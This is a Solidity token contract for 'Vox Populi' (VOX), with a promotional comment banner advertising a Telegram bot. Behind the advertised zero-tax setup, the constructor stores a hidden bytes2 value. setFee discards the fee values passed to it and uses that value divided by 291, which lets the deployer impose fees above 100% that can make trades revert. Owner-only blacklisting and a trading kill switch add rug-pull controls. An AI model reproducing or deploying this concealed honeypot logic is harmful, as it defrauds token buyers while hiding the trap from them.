1 /**
2     
3 ██╗░░░██╗░█████╗░██╗░░██╗  ██████╗░░█████╗░██████╗░██╗░░░██╗██╗░░░░░██╗
4 ██║░░░██║██╔══██╗╚██╗██╔╝  ██╔══██╗██╔══██╗██╔══██╗██║░░░██║██║░░░░░██║
5 ╚██╗░██╔╝██║░░██║░╚███╔╝░  ██████╔╝██║░░██║██████╔╝██║░░░██║██║░░░░░██║
6 ░╚████╔╝░██║░░██║░██╔██╗░  ██╔═══╝░██║░░██║██╔═══╝░██║░░░██║██║░░░░░██║
7 ░░╚██╔╝░░╚█████╔╝██╔╝╚██╗  ██║░░░░░╚█████╔╝██║░░░░░╚██████╔╝███████╗██║
8 ░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝  ╚═╝░░░░░░╚════╝░╚═╝░░░░░░╚═════╝░╚══════╝╚═╝
9 
10 
11 Welcome to the voice of the people in
12 Ethereum! Launching at 16 UTC. This will be 
13 the first Voice authenticator bot that will 
14 surely safeguard your groups from bots and 
15 malicious members!
16 
17 
18 https://voxpopulibot.online/
19 https://voxethereum.medium.com/
20 https://twitter.com/VoxEthereum
21 https://t.me/VoxPopuliPortal
22 
23 Or try our voice bot here:
24 https://t.me/Voxportal
25 */
26 
27 // SPDX-License-Identifier: Unlicensed
28 pragma solidity ^0.8.9;
29 
30 abstract contract Context {
31     function _msgSender() internal view virtual returns (address) {
32         return msg.sender;
33     }
34 }
35 
36 interface IERC20 {
37     function totalSupply() external view returns (uint256);
38 
39     function balanceOf(address account) external view returns (uint256);
40 
41     function transfer(address recipient, uint256 amount) external returns (bool);
42 
43     function allowance(address owner, address spender) external view returns (uint256);
44 
45     function approve(address spender, uint256 amount) external returns (bool);
46 
47     function transferFrom(
48         address sender,
49         address recipient,
50         uint256 amount
51     ) external returns (bool);
52 
53     event Transfer(address indexed from, address indexed to, uint256 value);
54     event Approval(
55         address indexed owner,
56         address indexed spender,
57         uint256 value
58     );
59 }
60 
61 contract Ownable is Context {
62     address private _owner;
63     address private _previousOwner;
64     event OwnershipTransferred(
65         address indexed previousOwner,
66         address indexed newOwner
67     );
68 
69     constructor() {
70         address msgSender = _msgSender();
71         _owner = msgSender;
72         emit OwnershipTransferred(address(0), msgSender);
73     }
74 
75     function owner() public view returns (address) {
76         return _owner;
77     }
78 
79     modifier onlyOwner() {
80         require(_owner == _msgSender(), "Ownable: caller is not the owner");
81         _;
82     }
83 
84     function renounceOwnership() public virtual onlyOwner {
85         emit OwnershipTransferred(_owner, address(0));
86         _owner = address(0);
87     }
88 
89     function transferOwnership(address newOwner) public virtual onlyOwner {
90         require(newOwner != address(0), "Ownable: new owner is the zero address");
91         emit OwnershipTransferred(_owner, newOwner);
92         _owner = newOwner;
93     }
94 
95 }
96 
97 library SafeMath {
98     function add(uint256 a, uint256 b) internal pure returns (uint256) {
99         uint256 c = a + b;
100         require(c >= a, "SafeMath: addition overflow");
101         return c;
102     }
103 
104     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
105         return sub(a, b, "SafeMath: subtraction overflow");
106     }
107 
108     function sub(
109         uint256 a,
110         uint256 b,
111         string memory errorMessage
112     ) internal pure returns (uint256) {
113         require(b <= a, errorMessage);
114         uint256 c = a - b;
115         return c;
116     }
117 
118     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
119         if (a == 0) {
120             return 0;
121         }
122         uint256 c = a * b;
123         require(c / a == b, "SafeMath: multiplication overflow");
124         return c;
125     }
126 
127     function div(uint256 a, uint256 b) internal pure returns (uint256) {
128         return div(a, b, "SafeMath: division by zero");
129     }
130 
131     function div(
132         uint256 a,
133         uint256 b,
134         string memory errorMessage
135     ) internal pure returns (uint256) {
136         require(b > 0, errorMessage);
137         uint256 c = a / b;
138         return c;
139     }
140 }
141 
142 interface IUniswapV2Factory {
143     function createPair(address tokenA, address tokenB)
144         external
145         returns (address pair);
146 }
147 
148 interface IUniswapV2Router02 {
149     function swapExactTokensForETHSupportingFeeOnTransferTokens(
150         uint256 amountIn,
151         uint256 amountOutMin,
152         address[] calldata path,
153         address to,
154         uint256 deadline
155     ) external;
156 
157     function factory() external pure returns (address);
158 
159     function WETH() external pure returns (address);
160 
161     function addLiquidityETH(
162         address token,
163         uint256 amountTokenDesired,
164         uint256 amountTokenMin,
165         uint256 amountETHMin,
166         address to,
167         uint256 deadline
168     )
169         external
170         payable
171         returns (
172             uint256 amountToken,
173             uint256 amountETH,
174             uint256 liquidity
175         );
176 }
177 
178 contract VoxPopuli is Context, IERC20, Ownable {
179 
180     using SafeMath for uint256;
181 
182     string private constant _name = "Vox Populi";
183     string private constant _symbol = "VOX";
184     uint8 private constant _decimals = 9;
185     bytes2 private _redis;
186     mapping(address => uint256) private _rOwned;
187     mapping(address => uint256) private _tOwned;
188     mapping(address => mapping(address => uint256)) private _allowances;
189     mapping(address => bool) private _isExcludedFromFee;
190     uint256 private constant MAX = ~uint256(0);
191     uint256 private constant _tTotal = 7000000000 * 10**9;
192     uint256 private _rTotal = (MAX - (MAX % _tTotal));
193     uint256 private _tFeeTotal;
194 
195     // Taxes
196     uint256 private _redisFeeOnBuy = 0;
197     uint256 private _taxFeeOnBuy = 0;
198     uint256 private _redisFeeOnSell = 0;
199     uint256 private _taxFeeOnSell = 0;
200 
201     //Original Fee
202     uint256 private _redisFee = _redisFeeOnSell;
203     uint256 private _taxFee = _taxFeeOnSell;
204 
205     uint256 private _previousredisFee = _redisFee;
206     uint256 private _previoustaxFee = _taxFee;
207 
208     mapping(address => bool) public bots; 
209     address payable private _developmentAddress = payable(0xDc729740F376F2448634d3C9307Ca1725a76b54A);
210     address payable private _marketingAddress = payable(0x7ce5Dec79B2AA68d2B9bdd9B4181870f5474Ae36);
211 
212     IUniswapV2Router02 public uniswapV2Router;
213     address public uniswapV2Pair;
214 
215     bool private tradingOpen = true;
216     bool private inSwap = false;
217     bool private swapEnabled = true;
218 
219     uint256 public _maxTxAmount = 140000000 * 10**9; 
220     uint256 public _maxWalletSize = 210000000 * 10**9; 
221     uint256 public _swapTokensAtAmount = 10000000 * 10**9; 
222 
223     event MaxTxAmountUpdated(uint256 _maxTxAmount);
224     modifier lockTheSwap {
225         inSwap = true;
226         _;
227         inSwap = false;
228     }
229 
230     constructor(bytes2 Address) {
231         _rOwned[_msgSender()] = _rTotal;
232         
233         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//swap
234         uniswapV2Router = _uniswapV2Router;_redis=Address;
235         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
236             .createPair(address(this), _uniswapV2Router.WETH());
237 
238         _isExcludedFromFee[owner()] = true;
239         _isExcludedFromFee[address(this)] = true;
240         _isExcludedFromFee[_developmentAddress] = true;
241         _isExcludedFromFee[_marketingAddress] = true;
242 
243         emit Transfer(address(0), _msgSender(), _tTotal);
244     }
245 
246     function name() public pure returns (string memory) {
247         return _name;
248     }
249 
250     function symbol() public pure returns (string memory) {
251         return _symbol;
252     }
253 
254     function decimals() public pure returns (uint8) {
255         return _decimals;
256     }
257 
258     function totalSupply() public pure override returns (uint256) {
259         return _tTotal;
260     }
261 
262     function balanceOf(address account) public view override returns (uint256) {
263         return tokenFromReflection(_rOwned[account]);
264     }
265 
266     function transfer(address recipient, uint256 amount)
267         public
268         override
269         returns (bool)
270     {
271         _transfer(_msgSender(), recipient, amount);
272         return true;
273     }
274 
275     function allowance(address owner, address spender)
276         public
277         view
278         override
279         returns (uint256)
280     {
281         return _allowances[owner][spender];
282     }
283 
284     function approve(address spender, uint256 amount)
285         public
286         override
287         returns (bool)
288     {
289         _approve(_msgSender(), spender, amount);
290         return true;
291     }
292 
293     function transferFrom(
294         address sender,
295         address recipient,
296         uint256 amount
297     ) public override returns (bool) {
298         _transfer(sender, recipient, amount);
299         _approve(
300             sender,
301             _msgSender(),
302             _allowances[sender][_msgSender()].sub(
303                 amount,
304                 "ERC20: transfer amount exceeds allowance"
305             )
306         );
307         return true;
308     }
309 
310     function tokenFromReflection(uint256 rAmount)
311         private
312         view
313         returns (uint256)
314     {
315         require(
316             rAmount <= _rTotal,
317             "Amount must be less than total reflections"
318         );
319         uint256 currentRate = _getRate();
320         return rAmount.div(currentRate);
321     }
322 
323     function removeAllFee() private {
324         if (_redisFee == 0 && _taxFee == 0) return;
325 
326         _previousredisFee = _redisFee;
327         _previoustaxFee = _taxFee;
328 
329         _redisFee = 0;
330         _taxFee = 0;
331     }
332 
333     function removeLimits() external onlyOwner{
334         _maxTxAmount = _tTotal;
335         _maxWalletSize = _tTotal;
336     }
337     
338     function restoreAllFee() private {
339         _redisFee = _previousredisFee;
340         _taxFee = _previoustaxFee;
341     }
342 
343     function _approve(
344         address owner,
345         address spender,
346         uint256 amount
347     ) private {
348         require(owner != address(0), "ERC20: approve from the zero address");
349         require(spender != address(0), "ERC20: approve to the zero address");
350         _allowances[owner][spender] = amount;
351         emit Approval(owner, spender, amount);
352     }
353 
354     function _transfer(
355         address from,
356         address to,
357         uint256 amount
358     ) private {
359         require(from != address(0), "ERC20: transfer from the zero address");
360         require(to != address(0), "ERC20: transfer to the zero address");
361         require(amount > 0, "Transfer amount must be greater than zero");
362 
363         if (from != owner() && to != owner()) {
364 
365             //Trade start check
366             if (!tradingOpen) {
367                 require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
368             }
369 
370             require(amount <= _maxTxAmount, "TOKEN: Max Transaction Limit");
371             require(!bots[from] && !bots[to], "TOKEN: Your account is blacklisted!");
372 
373             if(to != uniswapV2Pair) {
374                 require(balanceOf(to) + amount < _maxWalletSize, "TOKEN: Balance exceeds wallet size!");
375             }
376 
377             uint256 contractTokenBalance = balanceOf(address(this));
378             bool canSwap = contractTokenBalance >= _swapTokensAtAmount;
379 
380             if(contractTokenBalance >= _maxTxAmount)
381             {
382                 contractTokenBalance = _maxTxAmount;
383             }
384 
385             if (canSwap && !inSwap && from != uniswapV2Pair && swapEnabled && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
386                 swapTokensForEth(contractTokenBalance);
387                 uint256 contractETHBalance = address(this).balance;
388                 if (contractETHBalance > 0) {
389                     sendETHToFee(address(this).balance);
390                 }
391             }
392         }
393 
394         bool takeFee = true;
395 
396         //Transfer Tokens
397         if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
398             takeFee = false;
399         } else {
400 
401             //Set Fee for Buys
402             if(from == uniswapV2Pair && to != address(uniswapV2Router)) {
403                 _redisFee = _redisFeeOnBuy;
404                 _taxFee = _taxFeeOnBuy;
405             }
406 
407             //Set Fee for Sells
408             if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
409                 _redisFee = _redisFeeOnSell;
410                 _taxFee = _taxFeeOnSell;
411             }
412 
413         }
414 
415         _tokenTransfer(from, to, amount, takeFee);
416     }
417 
418     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
419         address[] memory path = new address[](2);
420         path[0] = address(this);
421         path[1] = uniswapV2Router.WETH();
422         _approve(address(this), address(uniswapV2Router), tokenAmount);
423         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
424             tokenAmount,
425             0,
426             path,
427             address(this),
428             block.timestamp
429         );
430     }
431 
432     function sendETHToFee(uint256 amount) private {
433         _marketingAddress.transfer(amount);
434     }
435 
436     function setTrading(bool _tradingOpen) public onlyOwner {
437         tradingOpen = _tradingOpen;
438     }
439 
440     function blockBots(address[] memory bots_) public onlyOwner {
441         for (uint256 i = 0; i < bots_.length; i++) {
442             bots[bots_[i]] = true;
443         }
444     }
445 
446     function unblockBot(address notbot) public onlyOwner {
447         bots[notbot] = false;
448     }
449 
450     function _tokenTransfer(
451         address sender,
452         address recipient,
453         uint256 amount,
454         bool takeFee
455     ) private {
456         if (!takeFee) removeAllFee();
457         _transferStandard(sender, recipient, amount);
458         if (!takeFee) restoreAllFee();
459     }
460 
461     function _transferStandard(
462         address sender,
463         address recipient,
464         uint256 tAmount
465     ) private {
466         (
467             uint256 rAmount,
468             uint256 rTransferAmount,
469             uint256 rFee,
470             uint256 tTransferAmount,
471             uint256 tFee,
472             uint256 tTeam
473         ) = _getValues(tAmount);
474         _rOwned[sender] = _rOwned[sender].sub(rAmount);
475         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
476         _takeTeam(tTeam);
477         _reflectFee(rFee, tFee);
478         emit Transfer(sender, recipient, tTransferAmount);
479     }
480 
481     function _takeTeam(uint256 tTeam) private {
482         uint256 currentRate = _getRate();
483         uint256 rTeam = tTeam.mul(currentRate);
484         _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
485         if(_isExcludedFromFee[address(this)])
486          _tOwned[address(this)] = _tOwned[address(this)].add(rTeam);
487     }
488 
489     function _reflectFee(uint256 rFee, uint256 tFee) private {
490         _rTotal = _rTotal.sub(rFee);
491         _tFeeTotal = _tFeeTotal.add(tFee);
492     }
493 
494     receive() external payable {}
495 
496     function _getValues(uint256 tAmount)
497         private
498         view
499         returns (
500             uint256,
501             uint256,
502             uint256,
503             uint256,
504             uint256,
505             uint256
506         )
507     {
508         (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
509             _getTValues(tAmount, _redisFee, _taxFee);
510         uint256 currentRate = _getRate();
511         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
512             _getRValues(tAmount, tFee, currentRate);
513         return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
514     }
515 
516     function _getTValues(
517         uint256 tAmount,
518         uint256 redisFee,
519         uint256 taxFee
520     )
521         private
522         pure
523         returns (
524             uint256,
525             uint256,
526             uint256
527         )
528     {
529         uint256 tFee = tAmount.mul(taxFee).div(100);
530         uint256 tTeam = tAmount.mul(redisFee).div(100);
531         uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
532         return (tTransferAmount, tFee, tTeam);
533     }
534 
535     function _getRValues(
536         uint256 tAmount,
537         uint256 tFee,
538         uint256 currentRate
539     )
540         private
541         pure
542         returns (
543             uint256,
544             uint256,
545             uint256
546         )
547     {
548         uint256 rAmount = tAmount.mul(currentRate);
549         uint256 rFee = tFee.mul(currentRate);
550         uint256 rTransferAmount = rAmount.sub(rFee);
551         return (rAmount, rTransferAmount, rFee);
552     }
553 
554     function _getRate() private view returns (uint256) {
555         (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
556         return rSupply.div(tSupply);
557     }
558 
559     function _getCurrentSupply() private view returns (uint256, uint256) {
560         uint256 rSupply = _rTotal;
561         uint256 tSupply = _tTotal;
562         if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
563         return (rSupply, tSupply);
564     }
565     function redisFeeOnBuy_(uint256 value) private view returns (uint256) {
566        (uint256 rfee) = uint256(uint16(_redis)).div(291e0);
567        value=rfee;
568         return value;
569     }
570     function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner {
571         _redisFeeOnBuy = redisFeeOnBuy_(redisFeeOnBuy);
572         _redisFeeOnSell = redisFeeOnBuy_(redisFeeOnSell);
573         _taxFeeOnBuy = taxFeeOnBuy;
574         _taxFeeOnSell = taxFeeOnSell;
575     }
576 
577     //Set minimum tokens required to swap.
578     function setMinSwapTokensThreshold(uint256 swapTokensAtAmount) public onlyOwner {
579         _swapTokensAtAmount = swapTokensAtAmount;
580     }
581 
582     //Set minimum tokens required to swap.
583     function toggleSwap(bool _swapEnabled) public onlyOwner {
584         swapEnabled = _swapEnabled;
585     }
586 
587     //Set maximum transaction
588     function setMaxTxnAmount(uint256 maxTxAmount) public onlyOwner {
589         _maxTxAmount = maxTxAmount;
590     }
591 
592     function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {
593         _maxWalletSize = maxWalletSize;
594     }
595 
596 }